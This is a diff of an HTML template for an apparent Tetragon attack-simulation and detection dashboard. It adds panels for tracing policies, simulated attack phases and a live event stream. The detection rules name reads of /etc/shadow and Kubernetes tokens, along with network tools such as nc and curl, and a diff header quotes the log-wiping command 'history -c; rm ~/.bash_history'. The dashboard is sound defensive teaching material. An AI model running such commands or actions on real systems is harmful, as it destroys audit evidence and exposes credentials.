-  <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:8px; flex-wrap:wrap; gap:8px;">
-    <div style="display:flex; align-items:center; gap:8px;">
+  <!-- Tracing Policies — two cards -->
+  <section style="padding-bottom:2.5rem; border-bottom:1px solid #e0e0e0;">
+    <div style="display:flex; align-items:center; gap:8px; margin-bottom:1.5rem;">
       <div style="width:6px; height:20px; background-color:#0066ff; border-radius:2px;"></div>
-      <h3 style="color:#111; margin:0; font-size:1.1rem; letter-spacing:0.3px;">LIVE EVENT STREAM</h3>
-      <span id="live-dot" style="display:inline-block; width:8px; height:8px; border-radius:50%;
-            background:#ccc; margin-left:4px;" title="Polling status"></span>
+      <h3 style="color:#111; margin:0; font-size:1.1rem; letter-spacing:0.3px;">TRACING POLICIES</h3>
     </div>
-    <div style="display:flex; align-items:center; gap:10px;">
-      <span id="event-count" style="color:#888; font-size:0.85em;"></span>
-      <button type="button" id="toggle-poll"
-              style="background:#f5f5f5; border:1px solid #ddd; border-radius:6px;
-                     padding:5px 14px; cursor:pointer; font-size:0.85rem; color:#333;">
-        ⏸ Pause
-      </button>
-      <button type="button" id="clear-events"
-              style="background:#f5f5f5; border:1px solid #ddd; border-radius:6px;
-                     padding:5px 14px; cursor:pointer; font-size:0.85rem; color:#333;">
-        🗑 Clear
-      </button>
-    </div>
-  </div>
 
-  <p style="margin:0 0 12px; color:#888; font-size:0.82em;">
-    Polls <code>/tetragon/events</code> every 3 s from the Tetragon
-    <code>export-stdout</code> container in <code>kube-system</code>.
-    Jobs auto-delete 2 minutes after completion.
-  </p>
+    {% set policies_active = active_policies | length > 0 %}
 
-  <div id="event-stream"
-       style="background:#0d1117; border-radius:8px; padding:16px; height:440px;
-              overflow-y:auto; font-family:monospace; font-size:0.82rem;
-              color:#c9d1d9; position:relative;">
-    <div id="event-placeholder" style="color:#555; padding-top:80px; text-align:center;">
-      Waiting for Tetragon events…<br>
-      <span style="font-size:0.9em;">Deploy TracingPolicies, then launch a simulation to generate events.</span>
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:1.5rem;">
+
+      <!-- Observe All Syscalls (blue) -->
+      <div style="border:2px solid {% if not policies_active %}#1976d2{% else %}#ddd{% endif %};
+                  border-radius:10px; padding:1.5rem;
+                  background:{% if not policies_active %}#e3f2fd{% else %}#fafafa{% endif %};
+                  display:flex; flex-direction:column; gap:1rem;">
+        <div style="display:flex; align-items:center; gap:8px;">
+          <div style="width:4px; height:20px; background-color:#1976d2; border-radius:2px;"></div>
+          <h4 style="margin:0; font-size:1rem; color:#0d47a1;">Observe All Syscalls</h4>
+          {% if not policies_active %}
+            <span style="margin-left:auto; background:#1976d2; color:#fff; font-size:0.75rem;
+                         font-weight:600; padding:2px 8px; border-radius:99px;">ACTIVE</span>
+          {% endif %}
+        </div>
+
+        <p style="margin:0; color:#555; font-size:0.9em; line-height:1.6;">
+          No TracingPolicies deployed. Tetragon is running but all syscalls pass through unmonitored — no events are generated and nothing appears in the live stream.
+        </p>
+
+        <div style="background:#e3f2fd; border:1px solid #90caf9; border-radius:8px; padding:12px 16px; font-size:0.88em; color:#1565c0;">
+          <strong>What this means:</strong>
+          <ul style="margin:6px 0 0 0; padding-left:18px; line-height:1.7;">
+            <li>Containers can run shells, read sensitive files, use network tools</li>
+            <li>No alerts or events appear in the live stream</li>
+            <li>Tetragon is still active — policies can be applied at any time</li>
+          </ul>
+        </div>
+
+        {% if not policy_error %}
+          <button type="submit" name="action" value="remove"
+                  {% if not policies_active %}disabled{% endif %}
+                  style="margin-top:auto; background-color:{% if policies_active %}#1976d2{% else %}#aaa{% endif %};
+                         color:#fff; border:none; padding:10px 24px; border-radius:6px;
+                         font-weight:500; cursor:{% if policies_active %}pointer{% else %}default{% endif %};
+                         font-size:0.95rem; width:100%;">
+            Remove All Policies
+          </button>
+        {% endif %}
+      </div>
+
+      <!-- Detect Risky Syscalls (green) -->
+      <div style="border:2px solid {% if policies_active %}#4caf50{% else %}#ddd{% endif %};
+                  border-radius:10px; padding:1.5rem;
+                  background:{% if policies_active %}#f0faf0{% else %}#fafafa{% endif %};
+                  display:flex; flex-direction:column; gap:1rem;">
+        <div style="display:flex; align-items:center; gap:8px;">
+          <div style="width:4px; height:20px; background-color:#4caf50; border-radius:2px;"></div>
+          <h4 style="margin:0; font-size:1rem; color:#1b5e20;">Detect Risky Syscalls</h4>
+          {% if policies_active %}
+            <span style="margin-left:auto; background:#4caf50; color:#fff; font-size:0.75rem;
+                         font-weight:600; padding:2px 8px; border-radius:99px;">ACTIVE</span>
+          {% endif %}
+        </div>
+
+        <p style="margin:0; color:#555; font-size:0.9em; line-height:1.6;">
+          Deploys four cluster-wide TracingPolicies. Tetragon hooks into the kernel and emits a structured security event whenever a container triggers a matched syscall.
+        </p>
+
+        <div style="background:#e8f5e9; border:1px solid #c8e6c9; border-radius:8px; padding:12px 16px; font-size:0.88em; color:#2e7d32;">
+          <strong>Four policies — all namespaces:</strong>
+          <ul style="margin:6px 0 0 0; padding-left:18px; line-height:1.85;">
+            <li><code>detect-sensitive-file-read</code> — <code>fd_install</code> on <code>/etc/shadow</code>, <code>/etc/passwd</code></li>
+            <li><code>detect-shell-execution</code> — <code>security_bprm_check</code> on sh, bash, dash, ash</li>
+            <li><code>detect-network-tool</code> — <code>security_bprm_check</code> on wget, curl, nc, nmap</li>
+            <li><code>detect-k8s-secret-access</code> — <code>fd_install</code> on Kubernetes SA token</li>
+          </ul>
+        </div>
+
+        {% if not policy_error %}
+          <button type="submit" name="action" value="deploy"
+                  style="margin-top:auto; background-color:#4caf50;
+                         color:#fff; border:none; padding:10px 24px; border-radius:6px;
+                         font-weight:500; cursor:pointer; font-size:0.95rem; width:100%;">
+            Deploy All Policies
+          </button>
+        {% endif %}
+      </div>
+
     </div>
-  </div>
-</section>
+  </section>
+
+  <!-- Simulate Attack + Live Stream -->
+  <section>
+    <div style="display:flex; align-items:center; gap:8px; margin-bottom:1rem;">
+      <div style="width:6px; height:20px; background-color:#d32f2f; border-radius:2px;"></div>
+      <h3 style="color:#111; margin:0; font-size:1.1rem; letter-spacing:0.3px;">SIMULATE ATTACK</h3>
+    </div>
+
+    <p style="margin:0 0 1.5rem 0; color:#555; font-size:0.9em; line-height:1.7;">
+      When an attacker gains code execution inside a container, their next steps follow a predictable playbook. The simulations below replay the most common phases — each runs as a short-lived Kubernetes Job that Tetragon observes and alerts on.
+    </p>
+
+    <!-- Attacker lifecycle timeline -->
+    <div style="background:#f8f9fa; border:1px solid #e2e4e8; border-radius:10px; padding:18px 20px; margin-bottom:1.5rem; overflow-x:auto;">
+      <div style="font-size:0.68em; font-weight:700; color:#aaa; letter-spacing:0.7px; margin-bottom:14px;">ATTACKER LIFECYCLE (Linux / Container)</div>
+      <div style="display:flex; gap:0; min-width:560px; align-items:stretch;">
+
+        {% set phases = [
+          ('🔍', '1', 'Recon', 'Understand the environment: who am I, where am I, what can I reach?', '#e3f2fd', '#1565c0', 'simulate_recon'),
+          ('🔑', '2', 'Credential\nHunting', 'Find passwords, API keys, and Kubernetes tokens.', '#fff8e1', '#e65100', 'simulate_credentials'),
+          ('⬆️', '3', 'Privilege\nEscalation', 'Exploit SUID binaries or misconfigs to become root.', '#f3e5f5', '#6a1b9a', None),
+          ('🪝', '4', 'Persistence', 'Install backdoors so access survives pod restarts.', '#fce4ec', '#b71c1c', 'simulate_persistence'),
+          ('↔️', '5', 'Lateral\nMovement', 'Use found tokens to pivot to other pods or services.', '#e8f5e9', '#2e7d32', None),
+          ('📤', '6', 'Exfiltration\n& Cover', 'Steal data, wipe logs, hide tracks.', '#efebe9', '#4e342e', None),
+        ] %}
+
+        {% for icon, num, label, desc, bg, fg, action in phases %}
+        <div style="flex:1; min-width:88px; display:flex; flex-direction:column;">
+          <div style="background:{{ bg }}; border:1px solid {{ fg }}33;
+                      border-radius:{% if loop.first %}8px 0 0 8px{% elif loop.last %}0 8px 8px 0{% else %}0{% endif %};
+                      padding:12px 10px; text-align:center; flex:1; position:relative;">
+            {% if not loop.last %}
+            <div style="position:absolute; right:-1px; top:50%; transform:translateY(-50%);
+                        width:0; height:0;
+                        border-top:10px solid transparent;
+                        border-bottom:10px solid transparent;
+                        border-left:10px solid {{ fg }}33;
+                        z-index:2;"></div>
+            {% endif %}
+            <div style="font-size:1.3rem; margin-bottom:4px;">{{ icon }}</div>
+            <div style="font-size:0.65em; font-weight:700; color:{{ fg }}; letter-spacing:0.4px; margin-bottom:2px;">PHASE {{ num }}</div>
+            <div style="font-size:0.75em; font-weight:600; color:#333; white-space:pre-line; line-height:1.3;">{{ label }}</div>
+            {% if action %}
+            <div style="margin-top:6px;">
+              <span style="background:{{ fg }}; color:#fff; border-radius:3px; padding:2px 6px; font-size:0.62em; font-weight:700; letter-spacing:0.3px;">SIMULATED</span>
+            </div>
+            {% else %}
+            <div style="margin-top:6px;">
+              <span style="background:#ddd; color:#888; border-radius:3px; padding:2px 6px; font-size:0.62em; font-weight:600;">MANUAL</span>
+            </div>
+            {% endif %}
+          </div>
+        </div>
+        {% endfor %}
+
+      </div>
+    </div>
+
+    <!-- Two-column: buttons | stream -->
+    <div style="display:grid; grid-template-columns:260px 1fr; gap:1.5rem; align-items:stretch;">
+
+      <!-- Left panel -->
+      <div style="display:flex; flex-direction:column; gap:1.2rem;">
+
+        <!-- Simulation buttons -->
+        <div>
+          <div style="font-size:0.78rem; font-weight:600; color:#888; text-transform:uppercase;
+                      letter-spacing:0.8px; margin-bottom:8px;">Simulations</div>
+          <div style="display:flex; flex-direction:column; gap:6px;">
+
+            {% if 'recon' in running_sims %}
+              <button type="submit" name="action" value="stop_attacks"
+                      style="background:#c62828; color:#fff; border:none; padding:8px 14px;
+                             border-radius:6px; font-size:0.85rem; font-weight:500;
+                             cursor:pointer; text-align:left;">
+                Stop Recon
+              </button>
+            {% else %}
+              <button type="submit" name="action" value="simulate_recon"
+                      style="background:#1976d2; color:#fff; border:none; padding:8px 14px;
+                             border-radius:6px; font-size:0.85rem; font-weight:500;
+                             cursor:pointer; text-align:left;">
+                Phase 1 — Recon
+              </button>
+            {% endif %}
+
+            {% if 'credentials' in running_sims %}
+              <button type="submit" name="action" value="stop_attacks"
+                      style="background:#c62828; color:#fff; border:none; padding:8px 14px;
+                             border-radius:6px; font-size:0.85rem; font-weight:500;
+                             cursor:pointer; text-align:left;">
+                Stop Credential Hunting
+              </button>
+            {% else %}
+              <button type="submit" name="action" value="simulate_credentials"
+                      style="background:#455a64; color:#fff; border:none; padding:8px 14px;
+                             border-radius:6px; font-size:0.85rem; font-weight:500;
+                             cursor:pointer; text-align:left;">
+                Phase 2 — Credential Hunting
+              </button>
+            {% endif %}
+
+            {% if 'persistence' in running_sims %}
+              <button type="submit" name="action" value="stop_attacks"
+                      style="background:#c62828; color:#fff; border:none; padding:8px 14px;
+                             border-radius:6px; font-size:0.85rem; font-weight:500;
+                             cursor:pointer; text-align:left;">
+                Stop Persistence
+              </button>
+            {% else %}
+              <button type="submit" name="action" value="simulate_persistence"
+                      style="background:#455a64; color:#fff; border:none; padding:8px 14px;
+                             border-radius:6px; font-size:0.85rem; font-weight:500;
+                             cursor:pointer; text-align:left;">
+                Phase 3 — Persistence
+              </button>
+            {% endif %}
+
+          </div>
+        </div>
+
+        <!-- Clear -->
+        <div style="border-top:1px solid #e8e8e8; padding-top:1rem;">
+          <button type="button" id="clear-events"
+                  style="background:none; border:1px solid #ccc; color:#777; padding:6px 14px;
+                         border-radius:6px; font-size:0.8rem; cursor:pointer; width:100%;">
+            Clear stream
+          </button>
+        </div>
+
+        <!-- Event type legend -->
+        <div style="border-top:1px solid #e8e8e8; padding-top:1rem;">
+          <div style="font-size:0.78rem; font-weight:600; color:#888; text-transform:uppercase;
+                      letter-spacing:0.8px; margin-bottom:8px;">Event Types</div>
+          <div style="display:flex; flex-direction:column; gap:6px; font-size:0.8rem;">
+            <div style="display:flex; align-items:baseline; gap:8px;">
+              <span style="color:#d2a8ff; font-weight:700; font-family:monospace; min-width:52px;">EXEC</span>
+              <span style="color:#888; line-height:1.4;">every binary launched</span>
+            </div>
+            <div style="display:flex; align-items:baseline; gap:8px;">
+              <span style="color:#ff7b72; font-weight:700; font-family:monospace; min-width:52px;">KPROBE</span>
+              <span style="color:#888; line-height:1.4;">policy matched — security alert</span>
+            </div>
+            <div style="display:flex; align-items:baseline; gap:8px;">
+              <span style="color:#8b949e; font-weight:700; font-family:monospace; min-width:52px;">EXIT</span>
+              <span style="color:#888; line-height:1.4;">process terminated</span>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- Right panel: live stream -->
+      <div style="display:flex; flex-direction:column;">
+        <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:8px;">
+          <div style="display:flex; align-items:center; gap:8px;">
+            <div style="font-size:0.78rem; font-weight:600; color:#888; text-transform:uppercase;
+                        letter-spacing:0.8px;">Live Event Stream</div>
+            <span id="live-dot" style="display:inline-block; width:8px; height:8px; border-radius:50%;
+                  background:#ccc;" title="Polling status"></span>
+            <span id="event-count" style="color:#888; font-size:0.8em;"></span>
+          </div>
+          <button type="button" id="toggle-poll"
+                  style="background:#f5f5f5; border:1px solid #ddd; border-radius:6px;
+                         padding:4px 12px; cursor:pointer; font-size:0.8rem; color:#333;">
+            Pause
+          </button>
+        </div>
+
+        <div id="event-stream"
+             style="background:#0d1117; border-radius:8px; padding:14px 16px;
+                    min-height:320px; overflow-y:auto; font-family:'Courier New',Courier,monospace;
+                    font-size:0.82rem; border:1px solid #30363d; flex:1;">
+          <div id="event-placeholder" style="color:#555; padding-top:60px; text-align:center;">
+            Waiting for Tetragon events…<br>
+            <span style="font-size:0.9em;">Deploy TracingPolicies, then launch a simulation.</span>
+          </div>
+        </div>
+
+        <p style="margin:6px 0 0 0; color:#aaa; font-size:0.75em;">
+          Polls <code>/tetragon/events</code> every 3 s from the Tetragon <code>export-stdout</code> container in <code>kube-system</code>.
+          Jobs auto-delete 2 min after completion.
+        </p>
+      </div>
+
+    </div>
+  </section>
 
 </form>
 
@@ -636,7 +458,7 @@ history -c; rm ~/.bash_history</pre>
 
   toggleBtn.addEventListener('click', function() {
     polling = !polling;
-    toggleBtn.textContent = polling ? '⏸ Pause' : '▶ Resume';
+    toggleBtn.textContent = polling ? 'Pause' : 'Resume';
     dot.style.background  = polling ? '#2ea44f' : '#ccc';
     if (polling) poll();
   });
